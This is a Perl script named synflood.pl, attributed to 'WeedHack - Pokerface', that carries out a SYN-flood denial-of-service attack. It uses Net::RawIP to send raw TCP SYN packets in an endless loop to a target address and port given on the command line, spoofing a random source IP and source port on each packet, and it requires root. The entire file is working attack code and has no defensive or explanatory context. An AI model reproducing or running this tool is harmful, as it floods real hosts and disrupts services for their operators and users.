#!/usr/bin/perl
# synflood.pl - SSYN Dos
# Author: WeedHack - Pokerface
#
# Requires perl, Net::RawIP module, and root privileges

use Net::RawIP;

if($#ARGV == 2) {
($src,$dst,$port) = @ARGV;
$a = new Net::RawIP;
while(1) {
$src = join(".", map int rand 256, 1 .. 4);
$src_port = rand(65534)+1;
$a->set({ip => {saddr => $src,daddr => $dst},tcp => {source => $src_port,dest => $port, syn => 1}});
$a->send;
}
} else {
print "./synflooder source_ip destination_ip destination_port\n";
}